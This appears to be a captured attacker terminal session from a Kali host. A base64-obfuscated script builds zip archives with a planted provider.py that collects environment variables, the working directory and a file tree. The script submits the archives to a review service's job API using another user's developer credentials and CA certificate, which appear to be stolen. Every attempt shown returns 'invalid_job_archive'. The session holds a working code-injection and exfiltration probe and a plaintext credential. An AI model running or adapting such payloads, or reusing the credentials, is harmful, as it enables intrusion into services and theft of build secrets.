@@ -1,0 +1,68 @@
+└─$ └─$ 
+
+┌──(cinder@kali)-[~]
+└─$ └─$ base64 -d > /tmp/r18.sh <<'B64EOF'
+> c2V0ICtlCkNBPS9ob21lL3Jvd2FuLy5sb2NhbC9zaGFyZS9rZXBsZXJvcHMvY2EuY3J0CkNSRUQ9J3Jvd2FuLml0bzpma19kZXZlbG9wZXJfeVVXVEtTcXJjMTZ5M0s1XzVEZlE3cWFjZnQ5Yi05eG8nClM9InNzaCAtbyBCYXRjaE1vZGU9eWVzIC1vIFN0cmljdEhvc3RLZXlDaGVja2luZz1ubyByb3dhbi1kZXYiCnJ1bigpeyBlY2hvICI9PT09PSAkMSA9PT09PSI7ICRTICIkMSIgMj4mMTsgZWNobzsgfQpydW4gJ21rZGlyIC1wIC90bXAvazA5ICYmIGNkIC90bXAvazA5ICYmIGNhdCA+IG1rcHJvYmUucHkgPDxQWQppbXBvcnQganNvbixiYXNlNjQsemlwZmlsZSxpbyxzeXMsb3MKcmF3PW9wZW4oImZpeHR1cmUuanNvbiIsInJiIikucmVhZCgpCnByb3YgPSAiIiJpbXBvcnQganNvbixvcwpkZWYgcmVuZGVyX3JlcG9ydCgqYSwqKmt3KToKICAgIHRyeToKICAgICAgICBpbmZvPXsiYXJncyI6W3JlcHIoeClbOjIwMDBdIGZvciB4IGluIGFdLCJrd2FyZ3MiOntrOnJlcHIodilbOjIwMDBdIGZvciBrLHYgaW4ga3cuaXRlbXMoKX0sImVudiI6e2s6diBmb3Igayx2IGluIG9zLmVudmlyb24uaXRlbXMoKSBpZiAiS0VTVCIgaW4gayBvciAiUkVWSUVXIiBpbiBrIG9yICJCVUlMRCIgaW4ga30sImN3ZCI6b3MuZ2V0Y3dkKCksInRyZWUiOltdfQogICAgICAgIGZvciByb290LGRpcnMsZnMgaW4gb3Mud2FsaygiLiIpOgogICAgICAgICAgICBpbmZvWyJ0cmVlIl0uYXBwZW5kKFtyb290LHNvcnRlZChmcylbOjUwXV0pCiAgICAgICAgc3VtbWFyeT1qc29uLmR1bXBzKGluZm8pWzo2MDAwXQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIHN1bW1hcnk9IkVSUiAiK3JlcHIoZSkKICAgIG91dD1kaWN0KGFbMF0pIGlmIGEgYW5kIGlzaW5zdGFuY2UoYVswXSxkaWN0KSBlbHNlIHt9CiAgICBvdXRbImFzc2Vzc21lbnQiXT17InJhdGluZyI6ImNpbmRlci1wcm9iZSIsInN1bW1hcnkiOnN1bW1hcnl9CiAgICByZXR1cm4gb3V0CiIiIgp2YXJpYW50PXN5cy5hcmd2WzFdCm9iaj1zeXMuYXJndlsyXSBpZiBsZW4oc3lzLmFyZ3YpPjIgZWxzZSAiIgpiPWlvLkJ5dGVzSU8oKQp6PXppcGZpbGUuWmlwRmlsZShiLCJ3IikKei53cml0ZXN0cigicHJvdmlkZXIucHkiLHByb3YpCnoud3JpdGVzdHIoImZpeHR1cmUuanNvbiIscmF3KQppbXBvcnQganNvbiBhcyBKCmlmIHZhcmlhbnQhPSJub25lIjoKICAgIGlmIHZhcmlhbnQ9PSJzdHIiOgogICAgICAgIGQ9eyJzY2hlbWEiOiJmaWVsZGtlc3QucmV2aWV3LWltcG9ydC92MSIsInJ1bl9pZCI6IkJMRC0xODQyIiwib2JqZWN0IjpvYmp9CiAgICBlbGlmIHZhcmlhbnQ9PSJkaWN0IjoKICAgICAgICBkPXsic2NoZW1hIjoiZmllbGRrZXN0LnJldmlldy1pbXBvcnQvdjEiLCJydW5faWQiOiJCTEQtMTg0MiIsIm9iamVjdCI6eyJhcnRpZmFjdCI6b2JqfX0KICAgIGVsaWYgdmFyaWFudD09ImlucHV0c19vYmoiOgogICAgICAgIGQ9eyJzY2hlbWEiOiJmaWVsZGtlc3QucmV2aWV3LWltcG9ydC92MSIsInJ1bl9pZCI6IkJMRC0xODQyIiwiaW5wdXRzIjp7Im9iamVjdCI6b2JqfX0KICAgIHoud3JpdGVzdHIoImlucHV0cy9pbXBvcnQuanNvbiIsSi5kdW1wcyhkKSkKICAgIGlmIHZhcmlhbnQ9PSJvYmplY3RmaWxlIjoKICAgICAgICB6LndyaXRlc3RyKCJpbnB1dHMvb2JqZWN0IixvYmopCnouY2xvc2UoKQpwcmludChiYXNlNjQuYjY0ZW5jb2RlKGIuZ2V0dmFsdWUoKSkuZGVjb2RlKCkpClBZCmZvciBWIGluICJzdHIgQVJULUJMRC0xODQyLUlOVEVHUkFUSU9OLVJFVklFVyIgInN0ciBpbnRlZ3JhdGlvbi1yZXZpZXctaW5wdXQtdjMuanNvbiIgInN0ciAvYXBpL3J1bnMvQkxELTE4NDIvYXJ0aWZhY3RzL2ludGVncmF0aW9uLXJldmlldy1pbnB1dC12My5qc29uIiAiZGljdCBBUlQtQkxELTE4NDItSU5URUdSQVRJT04tUkVWSUVXIiAiaW5wdXRzX29iaiBBUlQtQkxELTE4NDItSU5URUdSQVRJT04tUkVWSUVXIjsgZG8KICBzZXQgLS0gJFYKICBlY2hvICIjIyMgdmFyaWFudCAkMSBvYmogJDIiCiAgQj0kKHB5dGhvbjMgbWtwcm9iZS5weSAiJDEiICIkMiIpCiAgY3VybCAtc1MgLW0gMjAgLWcgLS1jYWNlcnQgJyIkQ0EiJyAtdSAnIiRDUkVEIicgLUggIkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24vanNvbiIgLWQgIntcInRlbXBsYXRlXCI6XCJyZXBvcnQtY29uc3VtZXItdjJcIixcImlucHV0XCI6e1wiYXJjaGl2ZV9iYXNlNjRcIjpcIiRCXCJ9fSIgaHR0cHM6Ly9yZXZpZXcua2VwbGVyb3BzLnRlc3QvYXBpL2pvYnMKICBlY2hvCmRvbmUnIAo=
+> B64EOF
+
+┌──(cinder@kali)-[~]
+└─$ └─$ chmod +x /tmp/r18.sh; bash /tmp/r18.sh; echo DONEMARK_1795195205577$((6*7))
+===== mkdir -p /tmp/k09 && cd /tmp/k09 && cat > mkprobe.py <<PY
+import json,base64,zipfile,io,sys,os
+raw=open("fixture.json","rb").read()
+prov = """import json,os
+def render_report(*a,**kw):
+    try:
+        info={"args":[repr(x)[:2000] for x in a],"kwargs":{k:repr(v)[:2000] for k,v in kw.items()},"env":{k:v for k,v in os.environ.items() if "KEST" in k or "REVIEW" in k or "BUILD" in k},"cwd":os.getcwd(),"tree":[]}
+        for root,dirs,fs in os.walk("."):
+            info["tree"].append([root,sorted(fs)[:50]])
+        summary=json.dumps(info)[:6000]
+    except Exception as e:
+        summary="ERR "+repr(e)
+    out=dict(a[0]) if a and isinstance(a[0],dict) else {}
+    out["assessment"]={"rating":"cinder-probe","summary":summary}
+    return out
+"""
+variant=sys.argv[1]
+obj=sys.argv[2] if len(sys.argv)>2 else ""
+b=io.BytesIO()
+z=zipfile.ZipFile(b,"w")
+z.writestr("provider.py",prov)
+z.writestr("fixture.json",raw)
+import json as J
+if variant!="none":
+    if variant=="str":
+        d={"schema":"fieldkest.review-import/v1","run_id":"BLD-1842","object":obj}
+    elif variant=="dict":
+        d={"schema":"fieldkest.review-import/v1","run_id":"BLD-1842","object":{"artifact":obj}}
+    elif variant=="inputs_obj":
+        d={"schema":"fieldkest.review-import/v1","run_id":"BLD-1842","inputs":{"object":obj}}
+    z.writestr("inputs/import.json",J.dumps(d))
+    if variant=="objectfile":
+        z.writestr("inputs/object",obj)
+z.close()
+print(base64.b64encode(b.getvalue()).decode())
+PY
+for V in "str ART-BLD-1842-INTEGRATION-REVIEW" "str integration-review-input-v3.json" "str /api/runs/BLD-1842/artifacts/integration-review-input-v3.json" "dict ART-BLD-1842-INTEGRATION-REVIEW" "inputs_obj ART-BLD-1842-INTEGRATION-REVIEW"; do
+  set -- $V
+  echo "### variant $1 obj $2"
+  B=$(python3 mkprobe.py "$1" "$2")
+  curl -sS -m 20 -g --cacert /home/rowan/.local/share/keplerops/ca.crt -u rowan.ito:fk_developer_yUWTKSqrc16y3K5_5DfQ7qacft9b-9xo -H "Content-Type: application/json" -d "{\"template\":\"report-consumer-v2\",\"input\":{\"archive_base64\":\"$B\"}}" https://review.keplerops.test/api/jobs
+  echo
+done =====
+### variant str obj ART-BLD-1842-INTEGRATION-REVIEW
+{"error":"invalid_job_archive"}
+
+### variant str obj integration-review-input-v3.json
+{"error":"invalid_job_archive"}
+
+### variant str obj /api/runs/BLD-1842/artifacts/integration-review-input-v3.json
+{"error":"invalid_job_archive"}
+
+### variant dict obj ART-BLD-1842-INTEGRATION-REVIEW
+{"error":"invalid_job_archive"}
+
+### variant inputs_obj obj ART-BLD-1842-INTEGRATION-REVIEW
+{"error":"invalid_job_archive"}
+
+
